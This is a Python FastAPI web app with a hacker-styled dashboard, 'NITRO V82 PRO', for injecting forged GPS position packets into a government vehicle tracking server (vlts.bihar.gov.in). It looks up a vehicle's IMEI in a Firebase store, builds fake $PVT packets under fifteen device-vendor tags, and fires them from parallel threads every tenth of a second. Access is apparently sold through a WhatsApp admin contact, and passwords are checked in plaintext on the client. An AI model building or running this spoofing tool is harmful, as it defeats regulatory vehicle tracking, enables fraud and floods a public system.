import socket, threading, time, requests, json
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

# --- 🚀 REST API LOGIC (LOCKED - NO CHANGES) ---
DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"

firing = False
total_sent = 0
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]

@app.get("/fetch_data")
def fetch_data(vno: str):
    v_up = vno.upper().strip()
    try:
        response = requests.get(f"{DB_URL}/Data_Records/{v_up}.json")
        data = response.json()
        if data:
            return {"found": True, "imei": data.get('IMEI_No',''), "lat": data.get('Lat',''), "lon": data.get('Lon','')}
    except: pass
    return {"found": False, "err": "NOT_IN_DB"}

@app.get("/init")
def init(v:str, i:str, lt:str, ln:str):
    global firing, total_sent
    if not firing:
        v_up = v.upper().strip()
        firing, total_sent = True, 0
        payload = {"IMEI_No": i, "Lat": lt, "Lon": ln, "Status": "Active"}
        try: requests.put(f"{DB_URL}/Data_Records/{v_up}.json", json=payload)
        except: pass
        for tag in TAGS:
            threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
    return {"ok": True}

def handshake_worker(tag, imei, vno, lat, lon):
    global firing, total_sent
    while firing:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(("vlts.bihar.gov.in", 9999))
            now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
            dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
            pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
            s.sendall(bytes(pkt, 'ascii'))
            total_sent += 1
            s.close()
            time.sleep(0.1)
        except: time.sleep(1)

@app.get("/status")
def status(): return {"c": total_sent, "f": firing}

@app.get("/stop")
def stop(): global firing; firing = False; return {"ok": True}

# --- 🎨 OPTIMIZED UI (FULL MAP FIX) ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head><title>NITRO V82 PRO | PRESTIGE</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; }
        .login-box, .dashboard { width:420px; border:2px solid #0f0; padding:20px; background:rgba(0,10,0,0.95); border-radius:15px; box-shadow: 0 0 25px #0f0; margin-top:50px; }
        .dashboard { display:none; margin-top:20px; }
        input { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:14px; }
        button { width:100%; padding:14px; margin-top:15px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; }
        .user-wall { background:#001a00; border:1px solid #0f0; padding:12px; margin-top:10px; font-size:13px; display:none; color:#fff; border-radius:5px; }
        #map { width:100%; height:280px; margin-top:15px; border:1px solid #0f0; border-radius:10px; background: #111; }
        .progress-container { width:100%; height:10px; background:#111; margin-top:15px; border-radius:5px; display:none; border:1px solid #0f0; }
        #progress-bar { width:0%; height:100%; background:#0f0; box-shadow: 0 0 10px #0f0; }
        .nav { width:420px; display:flex; justify-content:space-between; font-size:13px; margin-top:20px; color:#fff; }
        .chk-group { display:flex; align-items:center; gap:10px; margin-top:12px; font-size:12px; }
        .chk-group input { width:auto; margin:0; }
        .admin-link { color:#007bff; text-decoration:none; font-weight:bold; font-size:16px; display:block; margin-top:10px; }
    </style></head><body>

    <div class="login-box" id="loginScreen">
        <h2 style="text-align:center;letter-spacing:5px;">NITRO LOGIN</h2>
        <input type="text" id="m_num" placeholder="MOBILE NUMBER">
        <input type="password" id="m_pass" placeholder="PASSWORD">
        <div class="chk-group"><input type="checkbox" id="rem"> <label>Remember Me</label></div>
        <button onclick="login()" style="background:#0f0;color:#000;">ACCESS SYSTEM</button>
        <div style="text-align:center; margin-top:20px;">
            Don't have access? <br>
            <a href="https://wa.me/917464010787?text=Sir,I%20need%20Nitro%20V82%20Access" class="admin-link">[ CONTACT ADMIN ]</a>
        </div>
    </div>

    <div class="nav" id="dashNav" style="display:none;">
        <span>USER: <b id="u_name" style="color:#0f0">...</b></span>
        <span onclick="logout()" style="cursor:pointer;color:red;">[ LOGOUT ]</span>
    </div>
    
    <div class="dashboard" id="dashScreen">
        <div class="user-wall" id="u_wall"></div>
        <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
        <input type="text" id="i" placeholder="IMEI">
        <div class="chk-group">
            <input type="checkbox" id="useDef" checked> 
            <label>Use Default Location (From Profile)</label>
        </div>
        <div style="display:flex;gap:5px;">
            <input type="text" id="lt" placeholder="LAT">
            <input type="text" id="ln" placeholder="LON">
        </div>
        <button onclick="getLocation()" style="font-size:11px;padding:8px;">[ GET CURRENT LOCATION ]</button>
        <button onclick="st()" id="startBtn" style="background:#0f0; color:#000; font-size:16px;">START INJECTION</button>
        <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
        <button onclick="location.reload()" style="color:yellow;border-color:yellow;font-size:11px;">RESET SYSTEM</button>
        <div class="progress-container" id="p-cont"><div id="progress-bar"></div></div>
        <div id="map"></div>
        <div style="display:flex;justify-content:space-between;margin-top:15px;">
            <span>SENT: <b id="c">0</b></span>
            <span id="st" style="color:lime">IDLE</span>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const DB = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com";
        let map, marker, curUser = null;

        // Initialize Map Function
        function initMap() {
            if (map) return;
            map = L.map('map').setView([20.59, 78.96], 5);
            L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png', {
                maxZoom: 19,
                attribution: 'OpenStreetMap'
            }).addTo(map);
            marker = L.marker([20.59, 78.96]).addTo(map);
            // Fix for half-loaded map
            setTimeout(() => { map.invalidateSize(); }, 400);
        }

        window.onload = () => {
            let saved = localStorage.getItem('nitro_user');
            if(saved) { curUser = JSON.parse(saved); showDash(); }
        }

        async function login() {
            let num = document.getElementById('m_num').value.trim();
            let pass = document.getElementById('m_pass').value.trim();
            let res = await fetch(`${DB}/users/${num}.json`);
            let data = await res.json();
            if(data && data.password == pass) {
                curUser = { ...data, mobile: num };
                if(document.getElementById('rem').checked) localStorage.setItem('nitro_user', JSON.stringify(curUser));
                showDash();
            } else { alert("WRONG PASSWORD"); }
        }

        async function showDash() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('dashScreen').style.display = 'block';
            document.getElementById('dashNav').style.display = 'flex';
            document.getElementById('u_name').innerText = curUser.mobile;
            
            initMap(); // Map load here

            let mRes = await fetch(`${DB}/user_messages/${curUser.mobile}.json`);
            let mData = await mRes.json();
            if(mData && mData.text) {
                let wall = document.getElementById('u_wall');
                wall.innerHTML = `● <b>ADMIN UPDATE:</b><br>${mData.text}`;
                wall.style.display = 'block';
            }
        }

        function smartFetch() {
            let v = document.getElementById('v').value.toUpperCase().trim();
            if(v.length < 5) return;
            fetch(`/fetch_data?vno=${v}`).then(r=>r.json()).then(d=>{
                if(d.found) {
                    document.getElementById('i').value = d.imei;
                    if(document.getElementById('useDef').checked) {
                        document.getElementById('lt').value = curUser.lat;
                        document.getElementById('ln').value = curUser.lon;
                    } else {
                        document.getElementById('lt').value = d.lat;
                        document.getElementById('ln').value = d.lon;
                    }
                    updateMap(document.getElementById('lt').value, document.getElementById('ln').value);
                }
            });
        }

        function updateMap(lt, ln) {
            let lat = parseFloat(lt), lon = parseFloat(ln);
            if(lat && lon && map) { 
                map.setView([lat, lon], 14); 
                marker.setLatLng([lat, lon]);
                map.invalidateSize(); // Force redraw on update
            }
        }

        function getLocation() {
            navigator.geolocation.getCurrentPosition(pos => {
                document.getElementById('lt').value = pos.coords.latitude.toFixed(6);
                document.getElementById('ln').value = pos.coords.longitude.toFixed(6);
                updateMap(pos.coords.latitude, pos.coords.longitude);
            });
        }

        function logout() { localStorage.removeItem('nitro_user'); location.reload(); }

        let mon;
        function st() {
            let v=document.getElementById('v').value, i=document.getElementById('i').value, lt=document.getElementById('lt').value, ln=document.getElementById('ln').value;
            fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}`);
            document.getElementById('st').innerText="FIRING"; document.getElementById('p-cont').style.display="block";
            if(!mon) mon = setInterval(() => {
                fetch('/status').then(r=>r.json()).then(d=>{
                    document.getElementById('c').innerText = d.c;
                    document.getElementById('progress-bar').style.width = (d.c % 100) + "%";
                });
            }, 1000);
        }
        function sp() { fetch('/stop'); clearInterval(mon); mon=null; document.getElementById('st').innerText="IDLE"; }
    </script></body></html>
    """
